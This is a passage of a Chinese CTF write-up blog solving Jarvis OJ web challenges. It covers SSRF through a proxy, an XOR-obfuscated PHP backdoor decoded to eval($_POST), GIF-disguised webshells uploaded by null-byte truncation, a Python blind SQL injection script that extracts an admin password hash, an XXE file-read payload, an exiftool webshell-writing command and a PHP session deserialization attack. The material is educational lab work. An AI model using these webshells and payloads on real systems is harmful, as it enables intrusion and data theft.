class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">body &#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">background</span><span class="selector-pseudo">:gray</span>;</span></span><br><span class="line"><span class="css"><span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Welcome Admin. Your flag is PCTF&#123;H45h_ext3ndeR_i5_easy_to_us3&#125; <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><p>关卡入口：<a href="http://web.jarvisoj.com:32782/" target="_blank" rel="noopener">http://web.jarvisoj.com:32782/</a></p><blockquote><p>小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？</p></blockquote><ol><li><p>点击管理员登陆按钮</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You don't have permission to access /admin/</span><br><span class="line">on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'you are not admin!'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;script&gt;alert('admin ip is 202.5.19.128')&lt;/script&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>XFF发现没什么用</p></li><li>再看发现图片的URL如下<blockquote><p>proxy.php?url=<a href="http://dn.jarvisoj.com/static/images/proxy.jpg" target="_blank" rel="noopener">http://dn.jarvisoj.com/static/images/proxy.jpg</a></p></blockquote></li><li><p>尝试双重文件包含,构造payload</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32782/proxy</span>.php?url=<span class="symbol">http:</span>/<span class="regexp">/202.5.19.128/proxy</span>.php?url=<span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32782/admin</span><span class="regexp">/</span></span><br><span class="line"><span class="regexp">回显:YOU'RE CLOOSING!</span></span><br><span class="line"><span class="regexp">这很坑必须是/admin</span><span class="regexp">/,之前一直试/admin</span>都不行，还以为环境错了</span><br></pre></td></tr></table></figure></li><li><p>考虑到题目说是一句话木马，所以现在是要找后门</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/robots.txt</span></span><br><span class="line"><span class="section">回显:</span></span><br><span class="line"><span class="section">User-agent: *</span></span><br><span class="line"><span class="section">Disallow:trojan.php</span></span><br><span class="line"><span class="section">Disallow:trojan.php.txt</span></span><br><span class="line"></span><br><span class="line"><span class="section">http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/trojan.php.txt</span></span><br><span class="line"><span class="section">回显:</span></span><br><span class="line">&lt;?php $&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;=(<span class="string">"!"</span>^<span class="string">"`"</span>).(<span class="string">"( "</span>^<span class="string">"&#123;"</span>).(<span class="string">"("</span>^<span class="string">"["</span>).(<span class="string">"~"</span>^<span class="string">";"</span>).(<span class="string">"|"</span>^<span class="string">"."</span>).(<span class="string">"*"</span>^<span class="string">"~"</span>);$&#123;(<span class="string">"#"</span>^<span class="string">"|"</span>).(<span class="string">"#"</span>^<span class="string">"|"</span>)&#125;((<span class="string">"-"</span>^<span class="string">"H"</span>). (<span class="string">"]"</span>^<span class="string">"+"</span>). (<span class="string">"["</span>^<span class="string">":"</span>). (<span class="string">","</span>^<span class="string">"@"</span>). (<span class="string">"&#125;"</span>^<span class="string">"U"</span>). (<span class="string">"e"</span>^<span class="string">"A"</span>). (<span class="string">"("</span>^<span class="string">"w"</span>).(<span class="string">"j"</span>^<span class="string">":"</span>). (<span class="string">"i"</span>^<span class="string">"&amp;"</span>). (<span class="string">"#"</span>^<span class="string">"p"</span>). (<span class="string">"&gt;"</span>^<span class="string">"j"</span>). (<span class="string">"!"</span>^<span class="string">"z"</span>). (<span class="string">"T"</span>^<span class="string">"g"</span>). (<span class="string">"e"</span>^<span class="string">"S"</span>). (<span class="string">"_"</span>^<span class="string">"o"</span>). (<span class="string">"?"</span>^<span class="string">"b"</span>). (<span class="string">"]"</span>^<span class="string">"t"</span>));?&gt;</span><br></pre></td></tr></table></figure></li><li><p>看不懂没关系，PHP运行一下</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Notice: Undefined offset: <span class="number">360</span> <span class="keyword">in</span> D:\phpstudy\WWW\trojan.php(<span class="number">1</span>) : <span class="keyword">assert</span> code <span class="keyword">on</span> <span class="literal">line</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="literal">Warning</span>: <span class="keyword">assert</span>(): Assertion <span class="string">"eval($_POST[360])"</span> failed <span class="keyword">in</span> D:\phpstudy\WWW\trojan.php <span class="keyword">on</span> <span class="literal">line</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>菜刀咯</p><blockquote><p>flag:CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}</p></blockquote></li></ol><h1 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h1><p>题目入口：<a href="http://web.jarvisoj.com:32785/" target="_blank" rel="noopener">http://web.jarvisoj.com:32785/</a></p><blockquote><p>“没有什么防护是一个漏洞解决不了的，如果有，那<br>就…..<br>“</p></blockquote><ol><li>有一个图片文件上传功能,提示说只能上传gif&amp;jpg</li><li><p>先上一个一句话</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>抓包改后缀php%00.jpg成功上传但菜刀死活连不上</p></li><li><p>但我们看到View功能是文件包含链接到index.php?page=xxx的</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.<span class="keyword">com</span>:<span class="number">32785</span>/<span class="built_in">index</span>.php?page=uploads/<span class="number">1568382396</span>.jpg</span><br><span class="line">回显：</span><br><span class="line">Warnin<span class="variable">g:</span> fopen(uploads/<span class="number">1568382396</span>.jpg.php): failed <span class="keyword">to</span> <span class="keyword">open</span> stream: No such <span class="keyword">file</span> <span class="built_in">or</span> directory in /<span class="keyword">opt</span>/lampp/htdocs/<span class="built_in">index</span>.php <span class="keyword">on</span> <span class="built_in">line</span> <span class="number">24</span></span><br><span class="line">No such file!</span><br></pre></td></tr></table></figure></li><li><p>发现jpg后带了php,果断%00截断</p><blockquote><p>You should not do this!</p></blockquote></li><li><p>估计我们的一句话被过滤了，换下姿势</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;script language="phP"&gt;</span>@eval($_POST[<span class="string">'a'</span>]);<span class="params">&lt;/script&gt;</span></span><br><span class="line"><span class="meta">#这里记住一句话后面不能有内容了，我不知道什么时候手贱多加一点，导致一直不能解析getflag,气死</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//web.jarvisoj.com:32785/index.php?page=uploads/1568385564.gif%00</span></span><br><span class="line"><span class="meta">#CTF&#123;upl0ad_sh0uld_n07_b3_a110wed&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>这里输入payload就getflag了，不用菜刀页也不用找flag路径，估计是题目考图片马，成功解析就行</p></li></ol><h1 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h1><p>题目入口：<a href="http://web.jarvisoj.com:32787/" target="_blank" rel="noopener">http://web.jarvisoj.com:32787/</a></p><blockquote><p>很简单的注入，大家试试？</p></blockquote><ol><li><p>登录框的注入题，账号为admin是提示密码错误，反之则用户名错误，说明用户名为admin，下面进行测试</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin' <span class="meta">#  返回密码错误，说明'#没有过滤</span></span><br><span class="line">admin' <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="meta">#  返回用户名错误，说明可能过滤空格和or等关键字</span></span><br><span class="line">admin'<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="meta">#  返回密码错误，说明只过滤空格</span></span><br></pre></td></tr></table></figure></li><li><p>总结，username存在sql注入，同时仅仅只是过滤了空格，那么就是一个盲注，密码错误即存在，下面给出网上payload<del>还不是自己太菜不会写</del>，理解一下就好</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="comment">#created by noble @ 2017.1.21</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = "http://web.jarvisoj.com:32787/login.php"</span><br><span class="line">table_name_temp = "admin'<span class="comment">/**/</span>and<span class="comment">/**/</span>ascii(substr((<span class="keyword">select</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>()<span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">0</span>,<span class="number">1</span>),&#123;<span class="number">0</span>&#125;,<span class="number">1</span>))&gt;&#123;<span class="number">1</span>&#125;<span class="comment">#"</span></span><br><span class="line">column_name_temp = <span class="string">"admin'/**/and/**/ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=0x61646D696E/**/limit/**/2,1),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></span><br><span class="line">password_temp = <span class="string">"admin'/**/and/**/ascii(substr((select/**/password/**/from/**/admin/**/limit/**/0,1),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></span><br><span class="line"><span class="keyword">result</span> = <span class="string">""</span></span><br><span class="line"><span class="keyword">session</span> = requests.Session()</span><br><span class="line"><span class="built_in">char</span> = <span class="string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, <span class="number">50</span>):      <span class="comment">#设置字符长度为50</span></span><br><span class="line">       <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">char</span>:</span><br><span class="line">              <span class="keyword">asc</span> = <span class="keyword">ord</span>(c)      <span class="comment">#获取字符的ascii值</span></span><br><span class="line">              username = password_temp.format(i, <span class="keyword">asc</span>)</span><br><span class="line">              <span class="comment">#print username</span></span><br><span class="line">              <span class="keyword">data</span> = &#123;<span class="string">'username'</span>: username,</span><br><span class="line">              <span class="string">'password'</span>: <span class="string">'admin'</span></span><br><span class="line">              &#125;</span><br><span class="line">              req = session.post(<span class="keyword">url</span>=<span class="keyword">url</span>, <span class="keyword">data</span>=<span class="keyword">data</span>, <span class="keyword">timeout</span>=<span class="number">10</span>)</span><br><span class="line">              <span class="keyword">status</span> = req.status_code</span><br><span class="line">              <span class="keyword">length</span> = req.headers[<span class="string">'content-length'</span>]</span><br><span class="line">              <span class="keyword">if</span> <span class="keyword">status</span> == <span class="number">200</span>:</span><br><span class="line">                     <span class="comment">#print length</span></span><br><span class="line">                     <span class="comment">#print req.text</span></span><br><span class="line">                     <span class="comment">#返回的长度只有1202和1205</span></span><br><span class="line">                     <span class="keyword">if</span> <span class="keyword">length</span> == <span class="string">"1205"</span>:</span><br><span class="line">                            <span class="keyword">result</span> += c</span><br><span class="line">                            print c</span><br><span class="line">                            break</span><br><span class="line">print <span class="keyword">result</span></span><br></pre></td></tr></table></figure></li><li><p>最后得到32位字符串，估计是md5，在线解得到密码<strong>eTAloCrEP</strong></p><blockquote><p>flag:CTF{s1mpl3_1nJ3ction_very_easy!!}</p></blockquote></li></ol><h1 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h1><p>题目入口：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p><blockquote><p>请设法获得目标机器/home/ctf/flag.txt中的flag值。</p></blockquote><ol><li><p>有一个提交框，输入什么就显示什么加上own,源码如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> xhr;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span></span><br><span class="line"><span class="actionscript"> <span class="keyword">var</span> xhr = XHR();</span></span><br><span class="line"><span class="actionscript">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span></span><br><span class="line"><span class="javascript">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span></span><br><span class="line"><span class="javascript">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span></span><br><span class="line"><span class="undefined">             tip_area.value = data.task.search+data.task.value;</span></span><br><span class="line"><span class="undefined">         &#125;</span></span><br><span class="line"><span class="undefined">     &#125;;</span></span><br><span class="line"><span class="actionscript">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span></span><br><span class="line"><span class="actionscript">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>通过抓包发现传的json包</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">请求:</span><br><span class="line">&#123;<span class="string">"search"</span>:<span class="string">"cat flag"</span>,<span class="string">"value"</span>:<span class="string">"own"</span>&#125;</span><br><span class="line">回应:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"task"</span>: &#123;</span><br><span class="line">    <span class="string">"done"</span>: false, </span><br><span class="line">    <span class="string">"search"</span>: <span class="string">"cat flag"</span>, </span><br><span class="line">    <span class="string">"value"</span>: <span class="string">"own"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>考虑到题目提示,想到了利用XXE读取文件</p></li><li>改Content-Type为application/xml,内容<name>hack!</name>,回显成功</li><li>构造payload<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE get[</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">hack</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">home</span>/<span class="attr">ctf</span>/<span class="attr">flag.txt</span>"&gt;</span>]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">get</span>&gt;</span>&amp;hack;<span class="tag">&lt;/<span class="name">get</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">#CTF</span><span class="template-variable">&#123;XxE_15_n0T_S7range_Enough&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure></li></ol><h1 id="图片上传漏洞"><a href="#图片上传漏洞" class="headerlink" title="图片上传漏洞"></a>图片上传漏洞</h1><p>题目入口：<a href="http://web.jarvisoj.com:32790/" target="_blank" rel="noopener">http://web.jarvisoj.com:32790/</a><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请设法获取/home/ctf/<span class="built_in">flag</span>.txt 中的<span class="built_in">flag</span>值。</span><br><span class="line">(建议使用png文件上传)</span><br></pre></td></tr></table></figure></p><ol><li>这题纯属就是涨姿势了，之前的各种绕过都不行，后来才发现是个CVE<a href="https://www.2cto.com/article/201605/505823.html" target="_blank" rel="noopener">参考</a></li><li>看WP说用exiftool生成图片马，但打死找不到生成的后门，<del>我太菜了，本想借刀杀人用别人留下的马，但也连不上好像被搅屎了</del>，日后再做</li><li>贴个payload<blockquote><p>exiftool -label=”\”|/bin/echo \&lt;?php \@eval(\$_POST[x])\;?> &gt;<br>/opt/lampp/htdocs/uploads/x.php; \”” 1.png</p></blockquote></li><li>上传然后filetype改为show</li></ol><h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><p>题目入口：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p><ol><li><p>进去直接看到源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//A webshell is wait for you</span></span></span><br><span class="line"><span class="php">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $mdzz;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $m = <span class="keyword">new</span> OowoO();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>传个phpinfo参数就能看到phpinfo,不知道要干嘛</p></li><li><p>继续学习姿势，网上WP</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"><span class="selector-id">#ini_set</span>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</span><br><span class="line">这是突破点</span><br></pre></td></tr></table></figure></li><li><p><strong>session.serialize_handler</strong>容易想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》。</p><blockquote><p>通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p></blockquote></li></ol><p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190916171728.png?raw=true" alt=""></p><ol start="5"><li>由phpinfo()页面知，<strong>session.upload_progress.enabled</strong>为<strong>On</strong>。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name<strong>同名</strong>变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session<br><img src="https://img-blog.csdn.net/20171103001723738?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd3lfOTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></li><li>但是，这时就有一个问题，在题目代码中，没有某个值是用来接受我们传入的数据，并储存到$_SESSION中的。<br>其实我们是有办法传入$_SESSION数据的，这里就利用到了|的反序列化问题</li><li><p>先构造上传和post同时进行的页面</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">不对字符编码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>接下来考虑序列化的问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 